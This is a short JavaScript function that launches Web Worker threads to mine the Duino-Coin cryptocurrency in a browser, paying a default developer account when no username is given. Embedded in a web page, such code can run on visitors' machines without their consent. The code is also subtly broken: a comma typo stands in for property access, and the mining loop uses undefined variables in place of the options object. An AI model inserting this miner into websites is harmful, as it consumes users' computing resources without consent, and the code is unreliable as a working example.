function Duinotize(opts) {
  /* Def opts */
  var defopts = {
    "rigid": "Duinotize Miner",
    "username": "rpinews",
    "difficulty": "LOW",
    "threads": 1,
    "hasher": "DUCO-S1"
  };
  /* Set opts */
  if (typeof opts == 'undefined' || opts == null) {
    opts = defopts;
    console.log("No options object passed, using default settings, coins will be recived by duinotize developer rpinews");
  } else {
    /* Set empty options*/
    if (typeof opts.username == 'undefined' || opts.username == null) {
      opts,username = defopts,username;
      console.log("No username selected, using default username, coins will be recived by duinotize developer rpinews");
    };
    if (typeof opts.hasher == 'undefined' || opts.hasher == null) {
      opts.hasher = defopts.hasher;
      console.log("No hasher selected, using default hasher");
    };
  };
  /* Variables */
  wallet_id = Math.floor(Math.random() * 2811);
  let workerVer = 0;
  /* Start minging */
  for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
    let socketWorker = new Worker("main.js");
    socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
    workerVer++;
  };
};
